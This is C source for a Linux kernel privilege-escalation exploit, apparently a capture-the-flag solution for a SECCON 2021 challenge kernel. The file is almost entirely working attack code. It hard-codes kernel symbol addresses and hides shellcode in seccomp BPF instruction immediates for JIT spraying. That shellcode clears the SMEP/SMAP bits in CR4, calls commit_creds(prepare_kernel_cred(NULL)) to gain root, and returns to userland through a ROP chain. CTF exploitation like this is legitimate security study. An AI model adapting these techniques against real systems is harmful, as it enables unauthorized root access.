#include "./exploit.h"
#include <linux/prctl.h>
#include <sys/mman.h>

/*********** constants ******************/

#define STACK 0xFFF000// must be
const ulong SECCOMP_RET_ALLOW = 0x7fff0000;

// KASLR is disabled
scu commit_creds = 0xffffffff81073ad0;
scu pkc = 0xffffffff81073c60;
scu trampoline = 0xffffffff81800e26;

#define NOP \
  ((struct bpf_insn){                                                          \
      .code = BPF_LD | BPF_IMM, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0x01eb9090})
#define BPF_RET_IMM(IMM) \
  ((struct bpf_insn){                                                          \
      .code = BPF_RET, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = IMM})

#define FSIZE 0x312 // COPIED FROM AUTHOR'S POC

// (END constants)

// clean e(dx|bx|cx|si|bp|sp), r([8-15])d, and jmp to $rip[$rax]
void seccon(ulong offset) {
  assert(syscall(1337, offset) == 0);
}

void install_filter(char *filter, ushort len) {
  struct sock_fprog prog = {
    .len = len,
    .filter = (struct sock_filter*)filter,
  };
  if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) errExit("no_new_privs");
  if(prctl(PR_SET_SECCOMP, 2, &prog) < 0) errExit("set_seccomp");
}

int main(int argc, char *argv[]) {
  puts("[+] start of exploit");
  struct bpf_insn nop = NOP;
  struct bpf_insn ret = BPF_RET_IMM(SECCOMP_RET_ALLOW);
  printf("[+] nirugiri @ %p\n", NIRUGIRI);
  save_state();
  ulong rop[] = {
    pkc,
    commit_creds,
    trampoline,
    0,
    0,
    (ulong)NIRUGIRI,
    (ulong)user_cs,
    (ulong)user_rflags,
    (ulong)user_sp,
    (ulong)user_ss,
  };
  ulong *filter = (ulong*)malloc((FSIZE + 1) * 8);

  // 2 more page is required cuz pkc() and etc uses stack
  const char *addr = (char*)mmap((void*)STACK, 2 * PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_POPULATE | MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED, -1, 0);
  if (addr == MAP_FAILED || addr != (char*)STACK) errExit("mmap");
  printf("[+] mapped @ %p\n", addr);

  for (int ix = 0; ix != sizeof(rop); ++ix)
    ((ulong*)(addr + PAGE))[ix] = rop[ix];
  for (int ix = 0; ix != FSIZE; ++ix)
    filter[ix] = *(ulong*)&nop;
  filter[FSIZE] = *(ulong*)&ret;

  ulong *chain = &filter[FSIZE - 20];
  /**** COPIED from comment in Discord of SECCON 2021 from author: @ptrYudai ********/
  /**** (NOTE: 'jmp 1' here means `jmp 0x3`, which skips valid opcode field and jump to operand field, which is actually shellcode for us.) **/
  /**** (NOTE: unprivileged bpf installation is disallowed in this kernel, but seccomp installation is allowed and JITed, **/
  /****   So below insts uses LD instruction, whose IMM field is shellcode.) **/
  /**** (NOTE: for the reason stated above, success rate is 75%. )  **/
  *chain++ = (ulong)(0x04E7200F) << 32; // mov rdi, cr4; add al, XX;
  // edx = ~0x300000
  *chain++ = (ulong)(0x01ebD231) << 32; // xor edx, edx; jmp 1;
  *chain++ = (ulong)(0x01ebC2FF) << 32; // inc edx; jmp 1;
  *chain++ = (ulong)(0x01ebE2D1) << 32; // shl edx, 1; jmp 1;
  *chain++ = (ulong)(0x01ebC2FF) << 32; // inc edx; jmp 1;
  *chain++ = (ulong)(0x0414E2C1) << 32; // shl edx, 20; add al, XX;
  *chain++ = (ulong)(0x01ebD2F7) << 32; // not edx;
  // rdi &= rdx
  *chain++ = (ulong)(0x04D72148) << 32; // and rdi, rdx; add al, XX;
  // cr4 = rdi
  *chain++ = (ulong)(0x04E7220F) << 32; // mov cr4, rdi; add al, XX;
  // esp = 0x1000000
  *chain++ = (ulong)(0x01ebE431) << 32; // xor esp, esp; jmp 1;
  *chain++ = (ulong)(0x01ebC4FF) << 32; // inc esp; jmp 1;
  *chain++ = (ulong)(0x0418E4C1) << 32; // shl esp, 24; add al, XX;
  // commit_creds(prepare_kernel_cred(NULL));
  *chain++ = (ulong)(0x01ebFF31) << 32; // xor edi, edi; jmp 1;
  *chain++ = (ulong)(0x01eb9058) << 32; // pop rax; nop; jmp 1;
  *chain++ = (ulong)(0x01ebD0FF) << 32; // call rax; jmp 1;
  *chain++ = (ulong)(0x04C78948) << 32; // mov rdi, rax; add al, XX;
  *chain++ = (ulong)(0x01eb9058) << 32; // pop rax; nop; jmp 1;
  *chain++ = (ulong)(0x01ebD0FF) << 32; // call rax; jmp 1;
  // jump to swapgs_restore_regs_and_return_to_usermode
  *chain++ = (ulong)(0xccE0FF58) << 32; // pop rax; jmp rax;
  /**** end copied ******************************************************************/

  install_filter((char*)filter, FSIZE + 1);
  seccon(0xffffffffc0000f00); // JITed code is loaded

  // end of life
  puts("[ ] END of life...");
  sleep(999999);
}

